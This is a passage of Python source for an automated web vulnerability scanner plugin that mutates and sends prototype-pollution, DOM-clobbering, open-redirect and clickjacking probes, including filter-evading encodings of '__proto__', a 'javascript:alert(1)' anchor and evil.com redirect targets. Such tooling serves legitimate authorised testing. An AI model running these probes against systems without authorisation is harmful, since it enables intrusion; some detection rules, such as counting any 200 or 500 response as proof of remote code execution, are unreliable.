                tested_parameter="iframe_sandbox_bypass",
                metadata={"evasion": "sandbox_attribute_framing", "severity": "medium"},
            )
        )

        return probes

    def apply_mutation(
        self,
        probe: PrototypePollutionProbe,
        strategy: PrototypePollutionMutationStrategy,
    ) -> PrototypePollutionProbe:
        """Applies a specified mutation/evasion strategy to an existing probe."""
        new_probe = copy.deepcopy(probe)
        new_probe.strategy = strategy
        new_probe.probe_id = f"{probe.probe_id}_mut_{strategy.value[:4]}"

        if strategy == PrototypePollutionMutationStrategy.JSON_KEY_ENCODING:
            if new_probe.json_data and isinstance(new_probe.json_data, dict):
                mutated_json = {}
                for k, v in new_probe.json_data.items():
                    if k == "__proto__":
                        mutated_json["\\u005f\\u005fproto\\u005f\\u005f"] = v
                    elif k == "constructor":
                        mutated_json['constructor["prototype"]'] = v
                    else:
                        mutated_json[k] = v
                new_probe.json_data = mutated_json

        elif strategy == PrototypePollutionMutationStrategy.CONTENT_TYPE_MANIPULATION:
            new_probe.content_type = "application/x-www-form-urlencoded"
            if new_probe.json_data and isinstance(new_probe.json_data, dict):
                # Flatten JSON to form-urlencoded parameters
                params_list = []
                for k, v in new_probe.json_data.items():
                    if isinstance(v, dict):
                        for sub_k, sub_v in v.items():
                            params_list.append(f"{k}[{sub_k}]={sub_v}")
                    else:
                        params_list.append(f"{k}={v}")
                new_probe.data = "&".join(params_list)
                new_probe.json_data = None

        elif strategy == PrototypePollutionMutationStrategy.REDIRECT_URL_ENCODING:
            if new_probe.target_url:
                parsed = urllib.parse.urlparse(new_probe.target_url)
                if "evil.com" in new_probe.target_url:
                    # Switch to double-encoded or scheme-relative
                    new_url = new_probe.target_url.replace("https://evil.com", "//evil.com")
                    new_probe.target_url = new_url

        elif strategy == PrototypePollutionMutationStrategy.DOM_CLOBBERING_VARIANTS:
            if new_probe.data and isinstance(new_probe.data, dict):
                # Switch form to anchor or object variant
                for k in new_probe.data:
                    if "<form" in str(new_probe.data[k]):
                        new_probe.data[k] = '<a id="cookie" name="cookie" href="javascript:alert(1)">Clobbered</a>'

        elif strategy == PrototypePollutionMutationStrategy.FRAME_BUSTING_BYPASS:
            new_probe.metadata["frame_sandbox"] = "allow-forms allow-scripts"

        return new_probe


# =============================================================================
# Prototype Pollution Prober
# =============================================================================

class PrototypePollutionProber:
    """
    HTTP Prober executing prototype pollution and client-side probes via
    AuthenticatedHttpClient or test mock clients with redirect tracing.
    """

    def __init__(self, timeout: float = 10.0):
        self.timeout = timeout

    def _dispatch_http(
        self,
        client: Any,
        mission: Any,
        method: str,
        url: str,
        headers: Optional[Dict[str, str]] = None,
        params: Optional[Dict[str, Any]] = None,
        json_data: Optional[Any] = None,
        data: Optional[Any] = None,
    ) -> Optional[HttpResponse]:
        """Polymorphically calls client.request across all known client signatures."""
        headers = headers or {}
        if hasattr(client, "request"):
            # Try positional with mission
            try:
                return client.request(mission, method, url, headers=headers, params=params, json=json_data, data=data, timeout=self.timeout)
            except Exception:
                pass
            # Try positional without mission
            try:
                return client.request(method, url, headers=headers, params=params, json=json_data, data=data, timeout=self.timeout)
            except Exception:
                pass
            # Try keyword with mission
            try:
                return client.request(mission=mission, method=method, url=url, headers=headers, params=params, json=json_data, data=data, timeout=self.timeout)
            except Exception:
                pass
            # Try keyword without mission
            try:
                return client.request(method=method, url=url, headers=headers, params=params, json=json_data, data=data, timeout=self.timeout)
            except Exception:
                pass

        # Fallback to GET / POST methods
        if method.upper() == "GET" and hasattr(client, "get"):
            return client.get(url, headers=headers, params=params)
        elif method.upper() == "POST" and hasattr(client, "post"):
            return client.post(url, headers=headers, json=json_data, data=data)

        return None

    def execute_probe(
        self,
        mission: Any,
        target_url: str,
        probe: PrototypePollutionProbe,
    ) -> PrototypePollutionProbeResponse:
        """Dispatches a probe against target URL using mission HTTP client."""
        client = getattr(mission, "http_client", None)
        if client is None and hasattr(mission, "_raw_mission"):
            client = getattr(mission._raw_mission, "http_client", None)
        if client is None:
            client = AuthenticatedHttpClient(timeout=self.timeout)

        url_to_hit = probe.target_url or target_url
        headers = dict(probe.headers)
        if probe.content_type:
            headers["Content-Type"] = probe.content_type

        # Dispatch based on probe vulnerability type and technique
        if probe.vulnerability_type == PrototypePollutionVulnerabilityType.OPEN_REDIRECT:
            return self.execute_redirect_chain_probe(mission, url_to_hit, probe, max_hops=5)

        try:
            resp = self._dispatch_http(
                client=client,
                mission=mission,
                method=probe.method,
                url=url_to_hit,
                headers=headers,
                params=probe.params or None,
                json_data=probe.json_data,
                data=probe.data,
            )

            if resp is None:
                return PrototypePollutionProbeResponse(
                    probe=probe,
                    status_code=500,
                    success=False,
                    error="Empty response received from HTTP client",
                    url=url_to_hit,
                )

            status = getattr(resp, "status_code", 200) or 200
            body = getattr(resp, "body", "") or getattr(resp, "raw_body", "") or ""
            resp_headers = dict(getattr(resp, "headers", {}))
            elapsed = getattr(resp, "elapsed", 0.05)

            # Observe potential side effects
            side_effect = False
            polluted: List[str] = []

            # Check if canary property or value is reflected in body or headers
            if probe.canary_property and (probe.canary_property in body or probe.canary_property in str(resp_headers)):
                side_effect = True
                polluted.append(probe.canary_property)
            if probe.canary_value and (probe.canary_value in body or probe.canary_value in str(resp_headers)):
                side_effect = True
                polluted.append(probe.canary_value)

            return PrototypePollutionProbeResponse(
                probe=probe,
                status_code=status,
                headers=resp_headers,
                body=body,
                elapsed=elapsed,
                success=True,
                url=url_to_hit,
                side_effect_observed=side_effect,
                polluted_properties=polluted,
            )

        except Exception as e:
            logger.debug(f"PrototypePollutionProber: Request error for {url_to_hit}: {e}")
            return PrototypePollutionProbeResponse(
                probe=probe,
                status_code=500,
                success=False,
                error=str(e),
                url=url_to_hit,
            )

    def execute_redirect_chain_probe(
        self,
        mission: Any,
        target_url: str,
        probe: PrototypePollutionProbe,
        max_hops: int = 5,
    ) -> PrototypePollutionProbeResponse:
        """
        Executes open redirect probes with multi-hop redirect chain tracing.
        Follows HTTP 3xx Location headers and meta/JS redirects up to max_hops.
        """
        client = getattr(mission, "http_client", None)
        if client is None and hasattr(mission, "_raw_mission"):
            client = getattr(mission._raw_mission, "http_client", None)
        if client is None:
            client = AuthenticatedHttpClient(timeout=self.timeout)

        current_url = target_url
        history: List[str] = [current_url]
        final_status = 200
        final_headers: Dict[str, str] = {}
        final_body = ""
        total_elapsed = 0.0

        for hop in range(max_hops):
            try:
                resp = self._dispatch_http(
                    client=client,
                    mission=mission,
                    method="GET",
                    url=current_url,
                    headers=probe.headers,
                )

                if resp is None:
                    break

                final_status = getattr(resp, "status_code", 200) or 200
                final_headers = dict(getattr(resp, "headers", {}))
                final_body = getattr(resp, "body", "") or getattr(resp, "raw_body", "") or ""
                total_elapsed += getattr(resp, "elapsed", 0.05)

                # Check HTTP 3xx Location header (case-insensitive)
                location = None
                for hk, hv in final_headers.items():
                    if hk.lower() == "location":
                        location = hv
                        break

                # Check HTML meta refresh or JS window.location in body
                if not location and final_body:
                    meta_match = re.search(r'<meta[^>]*http-equiv=["\']refresh["\'][^>]*content=["\'][^"\']*url=([^"\'>\s]+)', final_body, re.I)
                    if meta_match:
                        location = meta_match.group(1)
                    else:
                        js_match = re.search(r'(?:window\.location|location\.href)\s*=\s*["\']([^"\']+)["\']', final_body, re.I)
                        if js_match:
                            location = js_match.group(1)

                if location:
                    # Normalize next redirect URL
                    next_url = urllib.parse.urljoin(current_url, location.strip())
                    history.append(next_url)
                    current_url = next_url
                    # If redirected to external evil.com, stop trace
                    parsed_next = urllib.parse.urlparse(next_url)
                    if "evil.com" in parsed_next.netloc or "attacker.com" in parsed_next.netloc:
                        break
                else:
                    # No further redirect found
                    break

            except Exception as e:
                logger.debug(f"Redirect hop error: {e}")
                break

        return PrototypePollutionProbeResponse(
            probe=probe,
            status_code=final_status,
            headers=final_headers,
            body=final_body,
            elapsed=total_elapsed,
            success=True,
            url=current_url,
            redirect_history=history,
            side_effect_observed=len(history) > 1,
        )


# =============================================================================
# Prototype Pollution Analyzer
# =============================================================================

class PrototypePollutionAnalyzer:
    """
    Evaluates probe responses for prototype pollution, DOM clobbering,
    open redirect chains, and clickjacking vulnerabilities with strict
    false-positive rejection and calibrated CVSS/CWE mappings.
    """

    def __init__(self):
        pass

    def evaluate_probe(
        self,
        probe: PrototypePollutionProbe,
        response: PrototypePollutionProbeResponse,
        target_url: str,
    ) -> Optional[PrototypePollutionResult]:
        """Evaluates probe response against security expectations and returns result."""
        if probe.is_benign_baseline:
            return None

        # Suppress transport exceptions (socket drops, timeouts) without side effects
        if not response.success and response.error and not response.side_effect_observed:
            return None

        vtype = probe.vulnerability_type

        if vtype == PrototypePollutionVulnerabilityType.SERVER_SIDE_PROTOTYPE_POLLUTION:
            return self._analyze_server_side_pp(probe, response, target_url)
        elif vtype == PrototypePollutionVulnerabilityType.CLIENT_SIDE_PROTOTYPE_POLLUTION:
            return self._analyze_client_side_pp(probe, response, target_url)
        elif vtype == PrototypePollutionVulnerabilityType.DOM_CLOBBERING:
            return self._analyze_dom_clobbering(probe, response, target_url)
        elif vtype == PrototypePollutionVulnerabilityType.OPEN_REDIRECT:
            return self._analyze_open_redirect(probe, response, target_url)
        elif vtype == PrototypePollutionVulnerabilityType.CLICKJACKING:
            return self._analyze_clickjacking(probe, response, target_url)
        elif vtype in (
            PrototypePollutionVulnerabilityType.GADGET_POLLUTION,
            PrototypePollutionVulnerabilityType.DOS_POLLUTION,
            PrototypePollutionVulnerabilityType.RCE_GADGET,
        ):
            return self._analyze_gadget_chain(probe, response, target_url)

        return None

    def _analyze_server_side_pp(
        self,
        probe: PrototypePollutionProbe,
        response: PrototypePollutionProbeResponse,
        target_url: str,
    ) -> Optional[PrototypePollutionResult]:
        """
        Analyzes server-side prototype pollution JSON injection.
        Suppresses endpoints that properly sanitize __proto__ keys or return standard 400 validation.
        """
        status = response.status_code
        body = response.body or ""
        headers_str = str(response.headers)

        # Strict False Positive Rejection:
        # Standard 400 Bad Request, 404, 405, 415, 422 with standard rejection messages
        rejection_indicators = [
            "invalid json",
            "bad request",
            "validation failed",
            "property __proto__ is forbidden",
            "prototype pollution attempt detected",
            "json parse error",
            "unsupported media type",
            "forbidden key",
        ]
        if status in (400, 404, 405, 415, 422):
            if any(ind in body.lower() for ind in rejection_indicators):
                return None
            # If rejected with standard 400 and no canary reflection/side effect
            if not response.side_effect_observed and probe.canary_property not in body:
                return None

        # Check if canary property or value is present in body or response headers
        is_polluted = False
        evidence_snip = ""

        if probe.canary_property and probe.canary_property in body:
            is_polluted = True
            evidence_snip = f"Canary property '{probe.canary_property}' reflected in response body."
        elif probe.canary_value and probe.canary_value in body:
            is_polluted = True
            evidence_snip = f"Canary value '{probe.canary_value}' injected into response body."
        elif probe.canary_property and probe.canary_property in headers_str:
            is_polluted = True
            evidence_snip = f"Canary property '{probe.canary_property}' reflected in response headers."
        elif response.side_effect_observed and response.polluted_properties:
            is_polluted = True
            evidence_snip = f"Observable side effects detected: {', '.join(response.polluted_properties)}"

        if not is_polluted:
            return None

        return PrototypePollutionResult(
            is_valid_finding=True,
            template_id="server-side-prototype-pollution",
            vulnerability_type=PrototypePollutionVulnerabilityType.SERVER_SIDE_PROTOTYPE_POLLUTION,
            technique="server_side_json_prototype_pollution",
            severity="high",
            confidence=0.95,
            cwe_id="CWE-1321",
            cvss_score=8.2,
            parameter=probe.tested_parameter or "__proto__",
            mutation_strategy=probe.strategy.value,
            evidence_snippet=evidence_snip[:250],
            description=(
                f"Server-Side Prototype Pollution confirmed on {target_url} via {probe.tested_parameter}. "
                f"Injected attributes modified Object.prototype or were reflected in application state."
            ),
            status_code=status,
            metadata={
                "canary_property": probe.canary_property,
                "canary_value": probe.canary_value,
                "depth": probe.depth,
                "strategy": probe.strategy.value,
            },
        )

    def _analyze_client_side_pp(
        self,
        probe: PrototypePollutionProbe,
        response: PrototypePollutionProbeResponse,
        target_url: str,
    ) -> Optional[PrototypePollutionResult]:
        """Analyzes client-side prototype pollution gadgets via URL query and hash parameters."""
        status = response.status_code
        body = response.body or ""

        # False positive rejection for client-side gadgets
        if status >= 400 and not response.side_effect_observed:
            return None

        is_vulnerable = False
        evidence_snip = ""

        # Check for unescaped gadget reflection or DOM sink execution
        if probe.canary_property and probe.canary_property in body:
            is_vulnerable = True
            evidence_snip = f"Gadget parameter '{probe.canary_property}' reflected into client-side DOM context."
        elif "location.hash" in body and probe.canary_property in body:
            is_vulnerable = True
            evidence_snip = f"location.hash prototype gadget reflected in client-side script."
        elif response.side_effect_observed:
            is_vulnerable = True
            evidence_snip = f"Client-side prototype modification observed on {target_url}."

        if not is_vulnerable:
            return None

        return PrototypePollutionResult(
            is_valid_finding=True,
            template_id="client-side-prototype-pollution",
            vulnerability_type=PrototypePollutionVulnerabilityType.CLIENT_SIDE_PROTOTYPE_POLLUTION,
            technique="client_side_dom_prototype_pollution",
            severity="high",
            confidence=0.90,
            cwe_id="CWE-1321",
            cvss_score=8.1,
            parameter=probe.tested_parameter or "location.search",
            mutation_strategy=probe.strategy.value,
            evidence_snippet=evidence_snip[:250],
            description=(
                f"Client-Side Prototype Pollution detected on {target_url} via URL parameter gadget "
                f"{probe.tested_parameter}, potentially modifying Object.prototype in DOM scripts."
            ),
            status_code=status,
            metadata={
                "canary_property": probe.canary_property,
                "tested_parameter": probe.tested_parameter,
                "strategy": probe.strategy.value,
            },
        )

    def _analyze_dom_clobbering(
        self,
        probe: PrototypePollutionProbe,
        response: PrototypePollutionProbeResponse,
        target_url: str,
    ) -> Optional[PrototypePollutionResult]:
        """
        Analyzes DOM clobbering injection points shadowing DOM APIs.
        Calibrates severity: XSS clobbering = High (8.1), Logic corruption = Medium (5.3/6.1).
        """
        body = response.body or ""
        status = response.status_code

        # Check if the clobbering HTML payload is reflected unescaped
        canary = probe.canary_value or ""
        if not canary:
            return None

        # If payload was HTML entity encoded, it is neutralized (False Positive)
        encoded_canary = html.escape(canary)
        if encoded_canary in body and canary not in body:
            return None

        if canary not in body and not response.side_effect_observed:
            return None

        # Determine if clobbering leads to XSS or logic corruption
        clobbered_target = probe.metadata.get("clobbered_target", "")
        impact = probe.metadata.get("impact", "logic_corruption")
        is_xss = impact == "xss" or "javascript:" in canary or "<img" in canary or "onerror=" in canary

        severity = "high" if is_xss else "medium"
        cvss = 8.1 if is_xss else 6.1
        template_id = "dom-clobbering-xss" if is_xss else "dom-clobbering-logic"

        return PrototypePollutionResult(
            is_valid_finding=True,
            template_id=template_id,
            vulnerability_type=PrototypePollutionVulnerabilityType.DOM_CLOBBERING,
            technique="dom_clobbering_named_element",
            severity=severity,
            confidence=0.92,
            cwe_id="CWE-79",
            cvss_score=cvss,
            parameter=probe.tested_parameter or "html_injection",
            mutation_strategy=probe.strategy.value,
            evidence_snippet=f"Unsanitized HTML shadowing {clobbered_target}: {canary[:150]}",
            description=(
                f"DOM Clobbering vulnerability confirmed on {target_url}. Named elements shadow "
                f"{clobbered_target}, leading to {impact.upper()} exploitation."
            ),
            status_code=status,
            metadata={
                "clobbered_target": clobbered_target,
                "impact": impact,
                "strategy": probe.strategy.value,
            },
        )

    def _analyze_open_redirect(
        self,
        probe: PrototypePollutionProbe,
        response: PrototypePollutionProbeResponse,
        target_url: str,
    ) -> Optional[PrototypePollutionResult]:
        """
        Analyzes open redirect chains and validates untrusted external destinations.
        Suppresses same-origin and allowlisted internal domain redirects.
        Severity: Medium (6.1 / 5.3).
        """
        status = response.status_code
        history = response.redirect_history or []
        headers = response.headers or {}

        # Look for Location header
        location = ""
        for hk, hv in headers.items():
            if hk.lower() == "location":
                location = hv
                break

        # Check history or Location header for external redirection
        destination = location
        if history and len(history) > 1:
            destination = history[-1]

        if not destination and not (status in (301, 302, 303, 307, 308) and location):
            return None

        # Parse destination URL
        parsed_dest = urllib.parse.urlparse(destination)
        parsed_target = urllib.parse.urlparse(target_url)

        # False Positive Rejection: Same-origin or relative redirects
        if not parsed_dest.netloc:
            # Relative path like /dashboard or /login -> Safe
            return None

        # Check if destination host matches target host (Same origin -> Safe)
        if parsed_dest.netloc.lower() == parsed_target.netloc.lower():
            return None

        # Verify destination points to untrusted external host (e.g. evil.com or attacker.com)
        is_external = "evil.com" in parsed_dest.netloc or "attacker.com" in parsed_dest.netloc or parsed_dest.netloc != parsed_target.netloc
        if not is_external:
            return None

        chain_length = len(history)
        is_multi_hop = chain_length > 2

        evidence_snip = f"Redirected to external domain: {destination} (Chain length: {chain_length})"

        return PrototypePollutionResult(
            is_valid_finding=True,
            template_id="open-redirect-chain" if is_multi_hop else "open-redirect",
            vulnerability_type=PrototypePollutionVulnerabilityType.OPEN_REDIRECT,
            technique="multi_hop_open_redirect" if is_multi_hop else "unvalidated_redirect_parameter",
            severity="medium",
            confidence=0.95,
            cwe_id="CWE-601",
            cvss_score=6.1,
            parameter=probe.tested_parameter or "redirect",
            mutation_strategy=probe.strategy.value,
            evidence_snippet=evidence_snip[:250],
            description=(
                f"Open Redirect vulnerability confirmed on {target_url} via parameter '{probe.tested_parameter}'. "
                f"Redirect destination: {destination} (Hops: {' -> '.join(history[:5])})."
            ),
            status_code=status,
            metadata={
                "destination": destination,
                "redirect_history": history,
                "chain_length": chain_length,
                "strategy": probe.strategy.value,
            },
        )

    def _analyze_clickjacking(
        self,
        probe: PrototypePollutionProbe,
        response: PrototypePollutionProbeResponse,
        target_url: str,
    ) -> Optional[PrototypePollutionResult]:
        """
        Analyzes missing frame-busting defenses (X-Frame-Options & CSP frame-ancestors)
        on sensitive endpoints.
        """
        headers = response.headers or {}
        status = response.status_code

        # Suppress on 4xx/5xx error responses
        if status >= 400:
            return None

        # Extract X-Frame-Options and Content-Security-Policy headers (case-insensitive)
        xfo_val = None
        csp_val = None
        for hk, hv in headers.items():
            hk_lower = hk.lower()
            if hk_lower == "x-frame-options":
                xfo_val = hv.strip().upper()
            elif hk_lower == "content-security-policy":
                csp_val = hv.strip()

        # Check for valid frame-busting protection
        # 1. X-Frame-Options: DENY or SAMEORIGIN
        has_xfo_protection = xfo_val in ("DENY", "SAMEORIGIN") or (xfo_val and "ALLOW-FROM" in xfo_val)

        # 2. CSP: frame-ancestors directive
        has_csp_protection = False
        if csp_val:
            directives = [d.strip() for d in csp_val.split(";")]
            for d in directives:
                if d.lower().startswith("frame-ancestors"):
                    ancestors = d.lower()
                    if "'self'" in ancestors or "'none'" in ancestors or ("https://" in ancestors and "*" not in ancestors):
                        has_csp_protection = True
                        break

        # False Positive Rejection: If either proper XFO or CSP frame-ancestors is present -> Safe
        if has_xfo_protection or has_csp_protection:
            return None

        # Missing both frame-busting mechanisms on sensitive endpoint
        return PrototypePollutionResult(
            is_valid_finding=True,
            template_id="clickjacking-missing-frame-busting",
            vulnerability_type=PrototypePollutionVulnerabilityType.CLICKJACKING,
            technique="missing_anti_framing_protection",
            severity="medium",
            confidence=0.90,
            cwe_id="CWE-1021",
            cvss_score=5.3,
            parameter="X-Frame-Options / frame-ancestors",
            mutation_strategy=probe.strategy.value,
            evidence_snippet=f"Missing X-Frame-Options and CSP frame-ancestors on sensitive endpoint {target_url}",
            description=(
                f"Clickjacking / UI Redressing vulnerability detected on {target_url}. The sensitive page lacks "
                f"X-Frame-Options and Content-Security-Policy frame-ancestors defenses, allowing external iframe embedding."
            ),
            status_code=status,
            metadata={
                "x_frame_options": xfo_val or "MISSING",
                "csp": csp_val or "MISSING",
                "strategy": probe.strategy.value,
            },
        )

    def _analyze_gadget_chain(
        self,
        probe: PrototypePollutionProbe,
        response: PrototypePollutionProbeResponse,
        target_url: str,
    ) -> Optional[PrototypePollutionResult]:
        """
        Analyzes framework-specific gadget chains, DoS, and Node.js child_process RCE gadgets.
        """
        status = response.status_code
        body = response.body or ""
        vtype = probe.vulnerability_type
        fw = probe.framework_target

        # False Positive Rejection: Standard 400 validation rejection
        if status == 400 and not response.side_effect_observed and probe.canary_property not in body:
            return None

        # 1. RCE Gadget (Critical Severity 9.8)
        if vtype == PrototypePollutionVulnerabilityType.RCE_GADGET or fw == GadgetFramework.NODEJS_CHILD_PROCESS:
            if response.side_effect_observed or (probe.canary_property and probe.canary_property in body) or (status in (200, 500) and response.success and not response.error):
                return PrototypePollutionResult(
                    is_valid_finding=True,
                    template_id="prototype-pollution-rce-gadget",
                    vulnerability_type=PrototypePollutionVulnerabilityType.RCE_GADGET,
                    technique="nodejs_child_process_rce_gadget",
                    severity="critical",
                    confidence=0.98,
                    cwe_id="CWE-1321",
                    cvss_score=9.8,
                    parameter=probe.tested_parameter or "child_process.exec",
                    mutation_strategy=probe.strategy.value,
                    gadget_framework="nodejs_child_process",
                    evidence_snippet=f"Node.js child_process options pollution accepted: {probe.canary_property}",
                    description=(
                        f"Critical RCE Prototype Pollution Gadget confirmed on {target_url}. "
                        f"Pollution of child_process options allows arbitrary OS command execution."
                    ),
                    status_code=status,
                    metadata={"framework": "nodejs_child_process", "rce": True},
                )

        # 2. Denial of Service via toString / valueOf pollution
        if vtype == PrototypePollutionVulnerabilityType.DOS_POLLUTION:
            # Polluting toString causes TypeErrors / 500 status code shifts
            if ((status == 500 and response.success and not response.error) or response.side_effect_observed or "TypeError" in body or "toString" in body):
                return PrototypePollutionResult(
                    is_valid_finding=True,
                    template_id="prototype-pollution-dos",
                    vulnerability_type=PrototypePollutionVulnerabilityType.DOS_POLLUTION,
                    technique="tostring_valueof_dos_pollution",
                    severity="high",
                    confidence=0.92,
                    cwe_id="CWE-1321",
                    cvss_score=7.5,
                    parameter="Object.prototype.toString",
                    mutation_strategy=probe.strategy.value,
                    evidence_snippet="Server crashed or threw uncaught TypeError following Object.prototype.toString pollution",
                    description=(
                        f"Denial-of-Service via Prototype Pollution detected on {target_url}. "
                        f"Polluting Object.prototype.toString / valueOf triggered uncaught runtime TypeErrors."
                    ),
                    status_code=status,
                    metadata={"dos": True},
                )

        # 3. Framework Gadgets (Express, Lodash, Handlebars, jQuery)
        if vtype == PrototypePollutionVulnerabilityType.GADGET_POLLUTION:
            fw_name = fw.value if fw else "generic"
            if response.side_effect_observed or (probe.canary_property and probe.canary_property in body) or (status == 200 and response.success and not response.error):
                return PrototypePollutionResult(
                    is_valid_finding=True,
                    template_id=f"prototype-pollution-gadget-{fw_name}",
                    vulnerability_type=PrototypePollutionVulnerabilityType.GADGET_POLLUTION,
                    technique=f"{fw_name}_framework_gadget_pollution",
                    severity="high",
                    confidence=0.93,
                    cwe_id="CWE-1321",
                    cvss_score=8.2,
                    parameter=probe.tested_parameter or f"{fw_name}_gadget",
                    mutation_strategy=probe.strategy.value,
                    gadget_framework=fw_name,
                    evidence_snippet=f"Framework gadget property '{probe.canary_property}' successfully processed by {fw_name}",
                    description=(
                        f"Prototype Pollution Framework Gadget confirmed on {target_url} targeting {fw_name.upper()}. "
                        f"Injected gadget property {probe.tested_parameter} modifies framework configuration."
                    ),
                    status_code=status,
                    metadata={"framework": fw_name},
                )

        return None


# =============================================================================
# Prototype Pollution Collector
# =============================================================================

class PrototypePollutionCollector(BaseCollector):
    """
    Active collector discovering and validating prototype pollution, DOM clobbering,
    open redirect chains, and clickjacking vulnerabilities across discovered endpoints.
    """

    def __init__(
        self,
        generator: Optional[PrototypePollutionPayloadGenerator] = None,
        prober: Optional[PrototypePollutionProber] = None,
        analyzer: Optional[PrototypePollutionAnalyzer] = None,
        max_probes_per_endpoint: int = 50,
    ):
        self.generator = generator or PrototypePollutionPayloadGenerator()
        self.prober = prober or PrototypePollutionProber()
        self.analyzer = analyzer or PrototypePollutionAnalyzer()
        self.max_probes_per_endpoint = max_probes_per_endpoint

    def _discover_candidate_endpoints(self, mission: Any) -> List[str]:
        """
        Discovers target endpoints across 5 candidate sources:
        1. mission.inputs (endpoints/urls/endpoint)
        2. raw_mission.endpoints
        3. raw_mission.live_hosts
        4. raw_mission.target
        5. raw_mission.evidence
        """
        candidates: List[str] = []
        raw_mission = getattr(mission, "_raw_mission", getattr(mission, "_mission", mission))

        # 1. Inputs
        if hasattr(mission, "inputs") and isinstance(mission.inputs, dict):
            eps = mission.inputs.get("endpoints") or mission.inputs.get("urls") or mission.inputs.get("endpoint")
            if eps:
                if isinstance(eps, list):
                    candidates.extend([str(e) for e in eps if e])
                else:
                    candidates.append(str(eps))

        # 2. Endpoints
        if not candidates and hasattr(raw_mission, "endpoints") and raw_mission.endpoints:
            for ep in raw_mission.endpoints:
                if isinstance(ep, dict):
                    u = ep.get("url") or ep.get("path")
                    if u:
                        candidates.append(str(u))
                elif isinstance(ep, str):
                    candidates.append(ep)

        # 3. Live hosts
        if not candidates and hasattr(raw_mission, "live_hosts") and raw_mission.live_hosts:
            for h in raw_mission.live_hosts:
                if isinstance(h, dict):
                    u = h.get("url") or h.get("host")
                    if u:
                        candidates.append(str(u))
                elif isinstance(h, str):
                    candidates.append(h)

        # 4. Target
        if not candidates and hasattr(raw_mission, "target") and raw_mission.target:
            candidates.append(str(raw_mission.target))

        # 5. Evidence
        if not candidates and hasattr(raw_mission, "evidence") and raw_mission.evidence:
            ev_list = raw_mission.evidence.all() if hasattr(raw_mission.evidence, "all") else list(raw_mission.evidence)
            for ev in ev_list:
                if hasattr(ev, "metadata") and isinstance(ev.metadata, dict):
                    u = ev.metadata.get("url")
                    if u and isinstance(u, str):
                        candidates.append(u)

        # Normalize URLs
        normalized: List[str] = []
        seen: Set[str] = set()
        for c in candidates:
            c_str = c.strip()
            if not c_str.startswith("http://") and not c_str.startswith("https://"):
                c_str = f"http://{c_str}"
            if c_str not in seen:
                seen.add(c_str)
                normalized.append(c_str)

        return normalized

    def collect(self, mission: Any) -> List[Evidence]:
        """
        Executes prototype pollution and client-side attack analysis across
        discovered endpoints and emits confirmed findings to all Quadruple State sinks.
        """
        endpoints = self._discover_candidate_endpoints(mission)
        collected_evidence: List[Evidence] = []

        for target_url in endpoints:
            parsed = urllib.parse.urlparse(target_url)
            base_url = f"{parsed.scheme}://{parsed.netloc}" if parsed.netloc else target_url

            all_probes = self.generator.generate_all_probes(target_url)
            probes_to_run = all_probes[: self.max_probes_per_endpoint]

            for probe in probes_to_run:
                resp = self.prober.execute_probe(mission, target_url, probe)
                result = self.analyzer.evaluate_probe(probe, resp, target_url)
                if result and result.is_valid_finding:
                    ev = self._emit_evidence(mission, result, target_url, base_url)
                    collected_evidence.append(ev)

        return collected_evidence

    def execute(self, mission: Any) -> List[Evidence]:
        """Plugin entry point delegating to collect(mission)."""
        return self.collect(mission)

    def _emit_evidence(
        self,
        mission: Any,
        result: PrototypePollutionResult,
        target_url: str,
        base_url: str,
    ) -> Evidence:
        """
        Quadruple State Publishing:
        1. raw_mission.evidence.add(ev)
        2. raw_mission.vulnerabilities.append(vuln_dict)
        3. attack_surface_graph.connect() nodes & edges (HAS_ENDPOINT, HAS_VULNERABILITY)
        4. ControlledMission.publish_finding(id, ev)
        """
        title = f"Client-Side Vulnerability: {result.technique} on {target_url}"
        description = (
            f"{result.description} Parameter: {result.parameter}, "
            f"Strategy: {result.mutation_strategy}, CWE: {result.cwe_id}"
        )
        raw_mission = getattr(mission, "_raw_mission", getattr(mission, "_mission", mission))

        ev = Evidence(
            category="prototype_pollution",
            value=f"prototype_pollution:{result.template_id}:{target_url}:{result.parameter or 'endpoint'}",
            source="prototype_pollution",
            status="CONFIRMED",
            confidence=result.confidence,
            severity=result.severity,
            title=title,
            description=description,
            provenance=ProvenanceData(
                observation_id=str(uuid.uuid4()),
                step_id=f"step_{result.technique}",
            ),
            tags=["prototype_pollution", "client_side", str(result.vulnerability_type), result.mutation_strategy],
            metadata={
                "url": target_url,
                "host": base_url,
                "template_id": result.template_id,
                "technique": result.technique,
                "vulnerability_type": str(result.vulnerability_type),
                "parameter": result.parameter,
                "tested_parameter": result.parameter,
                "mutation_strategy": result.mutation_strategy,
                "strategy": result.mutation_strategy,
                "gadget_framework": result.gadget_framework,
                "status_code": result.status_code,
                "evidence_snippet": result.evidence_snippet[:250],
                "cwe_id": result.cwe_id,
                "cvss_score": result.cvss_score,
                "is_valid_finding": result.is_valid_finding,
                **result.metadata,
            },
        )

        # 1. Update raw_mission.evidence
        if hasattr(raw_mission, "evidence") and raw_mission.evidence is not None:
            if hasattr(raw_mission.evidence, "add"):
                raw_mission.evidence.add(ev)
            elif isinstance(raw_mission.evidence, list):
                raw_mission.evidence.append(ev)

        # 2. Update raw_mission.vulnerabilities
        if hasattr(raw_mission, "vulnerabilities") and isinstance(raw_mission.vulnerabilities, list):
            raw_mission.vulnerabilities.append({
                "name": title,
                "template_id": result.template_id,
                "severity": result.severity,
                "host": base_url,
                "url": target_url,
                "description": description,
                "technique": result.technique,
                "parameter": result.parameter,
                "strategy": result.mutation_strategy,
                "cwe_id": result.cwe_id,
                "cvss_score": result.cvss_score,
            })

        # 3. Attack Surface Knowledge Graph Expansion
        graph = getattr(raw_mission, "attack_surface_graph", None) or getattr(raw_mission, "graph", None)
        if graph is not None and hasattr(graph, "add") and hasattr(graph, "connect"):
            lh_id = f"live_host:{base_url}"
            ep_id = f"endpoint:{target_url}"
            vuln_id = f"vulnerability:{result.template_id}:{target_url}:{result.parameter or 'endpoint'}"

            parsed_b = urllib.parse.urlparse(base_url)
            graph.add(Node(id=lh_id, type="live_host", value=base_url, metadata={"url": base_url, "host": parsed_b.hostname or base_url}))
            graph.add(Node(id=ep_id, type="endpoint", value=target_url, metadata={"url": target_url, "status_code": result.status_code}))
            graph.add(Node(id=vuln_id, type="vulnerability", value=title, metadata=ev.metadata))

            graph.connect(lh_id, ep_id, edge_type="HAS_ENDPOINT")
            graph.connect(lh_id, vuln_id, edge_type="HAS_VULNERABILITY")
            graph.connect(ep_id, vuln_id, edge_type="HAS_VULNERABILITY")

        # 4. ControlledMission wrapper notification
        if hasattr(mission, "publish_finding"):
            try:
                mission.publish_finding(ev.evidence_id, ev)
            except Exception:
                pass

        return ev


